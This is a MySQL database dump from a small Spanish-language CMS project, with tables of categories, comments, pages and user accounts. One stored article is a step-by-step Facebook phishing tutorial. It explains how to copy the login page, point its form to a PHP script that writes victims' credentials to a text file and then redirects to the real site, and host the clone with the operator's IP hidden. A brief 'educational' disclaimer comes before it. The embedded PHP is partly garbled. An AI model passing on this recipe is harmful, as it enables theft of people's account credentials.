-- phpMyAdmin SQL Dump
-- version 5.0.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jul 11, 2020 at 07:12 PM
-- Server version: 10.4.11-MariaDB
-- PHP Version: 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `cms`
--

-- --------------------------------------------------------

--
-- Table structure for table `categorias`
--

CREATE TABLE `categorias` (
  `id` int(11) NOT NULL,
  `nombre` varchar(255) NOT NULL,
  `descripcion` mediumtext NOT NULL,
  `slug` varchar(30) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT current_timestamp(),
  `updated_at` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `categorias`
--

INSERT INTO `categorias` (`id`, `nombre`, `descripcion`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'Sin Categoría', 'Esta es la categoría predeterminada para todas las publicaciones', 'sin-categoria', '0000-00-00 00:00:00', '0000-00-00 00:00:00'),
(3, 'Humanidades', 'Humanidades en su conjunto', 'humanidades', '0000-00-00 00:00:00', '0000-00-00 00:00:00'),
(4, 'Hacking', 'Temas sobre hacking', 'Hacking', '0000-00-00 00:00:00', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `comentarios`
--

CREATE TABLE `comentarios` (
  `id` int(11) NOT NULL COMMENT 'Identificador único de cada comentario',
  `cuerpo` longtext NOT NULL COMMENT 'Texto que contiene cada comentario',
  `created_at` datetime NOT NULL COMMENT 'fecha de creación del comentario',
  `updated_at` datetime NOT NULL COMMENT 'Fecha y hora de actualización del comentario',
  `articulo` int(11) NOT NULL COMMENT 'Llave foránea que determina a que artículo pertenece el comentario',
  `usuario` int(11) NOT NULL COMMENT 'Llave foranea al usuario que creo el articulo'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `comentarios`
--

INSERT INTO `comentarios` (`id`, `cuerpo`, `created_at`, `updated_at`, `articulo`, `usuario`) VALUES
(28, 'allahu akbar :v', '2020-07-09 22:45:04', '2020-07-09 22:45:04', 42, 75);

-- --------------------------------------------------------

--
-- Table structure for table `contenidos`
--

CREATE TABLE `contenidos` (
  `id` int(11) NOT NULL COMMENT 'Identificador de contenido',
  `titulo` varchar(255) NOT NULL COMMENT 'Titulo de la página',
  `encabezado` varchar(255) NOT NULL COMMENT 'Encabezado e la página',
  `img_principal` varchar(255) NOT NULL COMMENT 'Ruta a la imagen principal',
  `cuerpo` longtext NOT NULL COMMENT 'Cuerpo de la página',
  `created_at` datetime NOT NULL DEFAULT current_timestamp() COMMENT 'Fecha y hora de creacion del articulo',
  `updated_at` datetime NOT NULL DEFAULT current_timestamp() COMMENT 'Fecha y hora de actualización del articulo',
  `categoria` int(11) NOT NULL,
  `usuario_creador` int(11) NOT NULL COMMENT 'Llave foranea que apunta al creador del articulo'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='Tabla que almacena todos los articulos publicados.';

--
-- Dumping data for table `contenidos`
--

INSERT INTO `contenidos` (`id`, `titulo`, `encabezado`, `img_principal`, `cuerpo`, `created_at`, `updated_at`, `categoria`, `usuario_creador`) VALUES
(42, 'PHISHING EN FACEBOOK', 'La manera más básica que hackear el Facebook de una persona!', 'topimgs/PHISHINGENFACEBOOK_img.jpg', '<p>EL SIGUIENTE CONTENIDO ES MERAMENTE EDUCATIVO CON EL FIN DE PROVEER INFORMACI&Oacute;N, NO NOS HACEMOS RESPONSABLES DEL MAL USO DE ESTE.</p>\r\n\r\n<p>Hoy&nbsp;hablaremos de phishing,&nbsp;un m&eacute;todo por el que &ldquo;una persona malvada&rdquo; duplica una web a la que accedemos mediante usuario y contrase&ntilde;a, y hace&nbsp;que nuestros credenciales en lugar de llegar a la original, queden almacenadas en su servidor&nbsp;.<br />\r\n&nbsp;</p>\r\n\r\n<p>Aqu&iacute; un ejemplo:</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/the-final-boss/public/media_images/1594481664_521e5bb087a7fe867e73.jpg\" style=\"height:248px; width:200px\" /></p>\r\n\r\n<p><strong>Facebook:</strong></p>\r\n\r\n<p>Nos dirigimos a la p&aacute;gina de Facebook y en cualquier espacio en blanco&nbsp;clicamos con el bot&oacute;n derecho del rat&oacute;n para obtener el men&uacute; contextual&nbsp;y seleccionar la opci&oacute;n &ldquo;Ver c&oacute;digo fuente de la p&aacute;gina&rdquo;.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594350831_1764ca5e71210918b305.jpg\" style=\"height:493px; width:959px\" /></p>\r\n\r\n<p>Esto nos abrir&aacute; una nueva pesta&ntilde;a (al menos en Chrome que es el navegador que estoy usando) que&nbsp;nos mostrar&aacute; dicho c&oacute;digo&nbsp;, el cual seleccionaremos y lo copiaremos a un documento nuevo del bloc de notas al que llamaremos &ldquo;index.html&rdquo; (sin las comillas que todav&iacute;a hay algunos que caen en esto&hellip;).</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594350923_289cdcc7fcedf8ac7358.jpg\" style=\"height:510px; width:959px\" /></p>\r\n\r\n<p>Ya en el bloc de notas, usaremos el comando Ctrl+B para buscar la cadena &ldquo;action=&rdquo; dentro del extenso c&oacute;digo.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594350982_3236fa1f052c9fbc80d0.jpg\" style=\"height:511px; width:959px\" /></p>\r\n\r\n<p>Como vemos, este &ldquo;action=&rdquo; apunta hacia una web donde se nos requerir&aacute; un inicio de sesi&oacute;n o login; y aqu&iacute; es donde empezamos a trabajar.&nbsp;Sustituiremos esa direcci&oacute;n&nbsp;a la que apunta por &ldquo;next.php&rdquo;, y si leemos inmediatamente antes de nuestro &ldquo;action=&rdquo; vemos que el c&oacute;digo especifica el m&eacute;todo por el que se enviar&aacute; la informaci&oacute;n de dicho login, que es &lsquo;post&rsquo;.</p>\r\n\r\n<p>Pues bien, tambi&eacute;n deberemos&nbsp;cambiar el m&eacute;todo &lsquo;post&rsquo; por el m&eacute;todo &lsquo;get&rsquo;&nbsp;(otro d&iacute;a nos paramos a explicar la diferencia entre estos dos m&eacute;todos de env&iacute;o de datos) para que quede tal y como muestra la imagen siguiente, y s&oacute;lo faltar&aacute; guardar el documento como index.html.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351035_17e79a6be0eca9212ede.jpg\" style=\"height:511px; width:960px\" /></p>\r\n\r\n<p>A continuaci&oacute;n,&nbsp;crearemos el script&nbsp;al que hemos redirigido la petici&oacute;n de login. Para esto abriremos un nuevo documento en el blog de notas que llamaremos next.php, y en el que copiaremos el siguiente c&oacute;digo:</p>\r\n\r\n<p><!--?php header(\"Location: http://www.Facebook.com/login.php \");</p--></p>\r\n\r\n<p>$handle = fopen(&quot;yaeresmio.txt&quot;, &quot;a&quot;);</p>\r\n\r\n<p>foreach($_GET as $variable =&gt; $value) {</p>\r\n\r\n<p>fwrite($handle, $variable); f</p>\r\n\r\n<p>write($handle, &quot;=&quot;);</p>\r\n\r\n<p>fwrite($handle, $value);</p>\r\n\r\n<p>fwrite($handle, &quot;\\r\\n&quot;);</p>\r\n\r\n<p>} frit&eacute;($ande, &quot;\\r\\n&quot;);</p>\r\n\r\n<p>fclose($handle);</p>\r\n\r\n<p>exit ?&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351187_5762fb98320c0114eb4b.jpg\" style=\"height:488px; width:960px\" /></p>\r\n\r\n<p>Ahora crearemos un segundo archivo con el bloc de notas que&nbsp;llamaremos yaeresmio.txt&nbsp;y que cerraremos dej&aacute;ndolo en blanco.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351237_0584459116e8537793a4.jpg\" style=\"height:493px; width:960px\" /></p>\r\n\r\n<p>El siguiente paso es&nbsp;subir estos tres archivos de texto a alg&uacute;n dominio o subdominio de alg&uacute;n hosting&nbsp;que tengamos (obviamente, este hosting debe proveer servicios php), adem&aacute;s de contar con un servicio de redirecci&oacute;n segura que oculte nuestra ip (nunca est&aacute; de m&aacute;s prevenir&hellip;). El proceso es simple ya que hoy d&iacute;a hay&nbsp;muchos servicios hosting que ofrecen un plan b&aacute;sico de forma gratuita&nbsp;, que es lo que necesitamos en este momento, para ello nos registramos e iniciamos el proceso de creaci&oacute;n de cuenta seleccionando el subdominio (si elegimos un plan gratuito no vamos a pagar ahora por un dominio, &iquest;no?) y la contrase&ntilde;a que usaremos.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351302_e333a99ab3f272f11f3c.jpg\" style=\"height:495px; width:960px\" /></p>\r\n\r\n<p>Recordamos con la siguiente imagen que el hosting que seleccionemos provea&nbsp;servicios php&nbsp;para que nuestro script se ejecute sin problemas. Y dicho esto nos dirigimos al apartado de acceso FTP para subir nuestros archivos a la red.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351366_684869289d3a33cef8cf.jpg\" style=\"height:451px; width:959px\" /></p>\r\n\r\n<p>Como vemos en la siguiente imagen&nbsp;, usando el propio gestor de archivos del hosting&nbsp;que hemos encontrado hemos subido con &eacute;xito nuestros archivos.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351415_91fb5f17a2b836ef29b5.jpg\" style=\"height:493px; width:959px\" /></p>\r\n\r\n<p>Vamos a entrar a nuestra direcci&oacute;n web para ver c&oacute;mo ver&aacute;n nuestras v&iacute;ctimas la p&aacute;gina que hemos copiado.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351473_a9847712d8f1aa4f96fd.jpg\" style=\"height:493px; width:959px\" /></p>\r\n\r\n<p>Comprobamos que con un par de&nbsp;ajustes en la codificaci&oacute;n&nbsp;de caracteres todo quedar&iacute;a de forma correcta, pero para este ejemplo y para que quede claro que es una p&aacute;gina copiada vamos a dejar estos s&iacute;mbolos tal cual. Por lo que lo &uacute;nico que queda es intentar loguearnos en &ldquo;nuestro Facebook&rdquo;. Usaremos como credenciales la direcci&oacute;n de correo electr&oacute;nico correo@deprueba.es y la contrase&ntilde;a &ldquo;contrase&ntilde;adeprueba&rdquo;.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351539_ee8c1fdef5d07467632f.jpg\" style=\"height:325px; width:959px\" /></p>\r\n\r\n<p>Y al hacer clic en &lsquo;Entrar&rsquo;, se nos redirige a la p&aacute;gina aut&eacute;ntica de Facebook porque &ldquo;parece ser que hemos escrito algo mal y debemos volver a introducir nuestros datos&rdquo;.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351587_2773e3c5a83c105d0af7.jpg\" style=\"height:493px; width:959px\" /></p>\r\n\r\n<p>Pero si en este momento nos dirigimos a nuestro hosting, y comprobamos el contenido del archivo &ldquo;yaeresmio.txt&rdquo; vemos esto que aparece en la siguiente imagen.</p>\r\n\r\n<p><img alt=\"\" src=\"http://localhost/final/public/media_images/1594351633_4cf0bf7f0b1ca6371909.jpg\" style=\"height:442px; width:959px\" /></p>\r\n\r\n<p>El correo y contrase&ntilde;a que hemos usado para nuestro ejemplo&nbsp;se ha almacenado en el archivo tal y como esper&aacute;bamos&nbsp;, por lo que nuestra web de phishing est&aacute; lista para funcionar.</p>\r\n\n   ', '2020-07-09 22:31:03', '2020-07-11 10:34:42', 4, 75);

-- --------------------------------------------------------

--
-- Table structure for table `paginas`
--

CREATE TABLE `paginas` (
  `id` int(11) NOT NULL COMMENT 'Identificador de las páginas',
  `titulo` varchar(255) NOT NULL,
  `encabezado` varchar(255) NOT NULL,
  `cuerpo` longtext NOT NULL,
  `created_at` datetime NOT NULL COMMENT 'Informacion de hora de creacion',
  `updated_at` datetime NOT NULL COMMENT 'Informacion de hora de actualización'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `paginas`
--

INSERT INTO `paginas` (`id`, `titulo`, `encabezado`, `cuerpo`, `created_at`, `updated_at`) VALUES
(1, 'Pagina', 'numero1', '<p>labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?&quot;<img alt=\"\" src=\"http://localhost:8080/ProyectoFinal/public/images/1592786047_c4afc8f9ee705d1f3f12.png\" style=\"float:left; height:204px; width:200px\" /></p>\r\n\n   ', '0000-00-00 00:00:00', '0000-00-00 00:00:00'),
(2, 'Saber más', 'Quienes somos ', '<p>Este es un proyecto que nos esta tomando m&aacute;s de una semana y media, pero esta teniendo buenos frutos en todos los participantes ya que estan aprendiendo a codificar de la mejor manera y con buenas practica, los quiero amigos &lt;3<a href=\"https://static1.abc.es/media/economia/2019/11/11/amor-kdG--620x349@abc.jpg\"><img alt=\"Amistad &lt;3\" src=\"https://static1.abc.es/media/economia/2019/11/11/amor-kdG--620x349@abc.jpg\" style=\"border-style:solid; border-width:3px; height:279px; width:500px\" /></a></p>\r\n\n   ', '2020-06-22 14:02:59', '2020-06-22 14:02:59');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL COMMENT 'identificador de usuario',
  `nombre_usuario` varchar(50) NOT NULL COMMENT 'username',
  `nombre` varchar(255) NOT NULL,
  `apellido` varchar(255) NOT NULL,
  `correo` varchar(50) NOT NULL,
  `contrasena` varchar(255) NOT NULL,
  `perfil` varchar(50) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT current_timestamp() COMMENT 'Hora de creación',
  `updated_at` datetime NOT NULL DEFAULT current_timestamp() COMMENT 'Hora de actualización'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `nombre_usuario`, `nombre`, `apellido`, `correo`, `contrasena`, `perfil`, `created_at`, `updated_at`) VALUES
(74, 'usuariopromedio', 'sadsad', 'wqewqeqw', 'usuariopromedio@usuario.com', '$2y$10$qB8tUxrnFCnXwkA7HVUEAel15LhIOBbHpJXpozYHQZqtagZgtDa5y', 'administrador', '2020-06-27 11:20:30', '2020-06-27 11:20:30'),
(75, 'Administrador', 'admin', 'admin', 'admin@admin.com', '$2y$10$CxPJbh0WqCekvAB11a0GaOMHp/DkteE9vNCkMbPiWTpHy4kCQIMva', 'administrador', '2020-06-27 11:25:52', '2020-06-27 11:25:52'),
(76, 'suscriptor', 'sus', 'criptor', 'suscriptor@suscriptor.com', '$2y$10$iweoXTCX9H2mdZsHISEKkuH0n7LnNlMH/i9R8imPBk5KMskzJAc9y', 'suscriptor', '2020-06-27 14:55:18', '2020-06-27 14:55:18');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categorias`
--
ALTER TABLE `categorias`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `comentarios`
--
ALTER TABLE `comentarios`
  ADD PRIMARY KEY (`id`),
  ADD KEY `articulo_comentario` (`articulo`),
  ADD KEY `comentario_user` (`usuario`);

--
-- Indexes for table `contenidos`
--
ALTER TABLE `contenidos`
  ADD PRIMARY KEY (`id`),
  ADD KEY `foreign_category` (`categoria`),
  ADD KEY `usuario_articulo` (`usuario_creador`);

--
-- Indexes for table `paginas`
--
ALTER TABLE `paginas`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categorias`
--
ALTER TABLE `categorias`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `comentarios`
--
ALTER TABLE `comentarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'Identificador único de cada comentario', AUTO_INCREMENT=29;

--
-- AUTO_INCREMENT for table `contenidos`
--
ALTER TABLE `contenidos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'Identificador de contenido', AUTO_INCREMENT=43;

--
-- AUTO_INCREMENT for table `paginas`
--
ALTER TABLE `paginas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'Identificador de las páginas', AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'identificador de usuario', AUTO_INCREMENT=77;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `comentarios`
--
ALTER TABLE `comentarios`
  ADD CONSTRAINT `articulo_comentario` FOREIGN KEY (`articulo`) REFERENCES `contenidos` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION,
  ADD CONSTRAINT `comentario_user` FOREIGN KEY (`usuario`) REFERENCES `user` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION;

--
-- Constraints for table `contenidos`
--
ALTER TABLE `contenidos`
  ADD CONSTRAINT `foreign_category` FOREIGN KEY (`categoria`) REFERENCES `categorias` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION,
  ADD CONSTRAINT `usuario_articulo` FOREIGN KEY (`usuario_creador`) REFERENCES `user` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
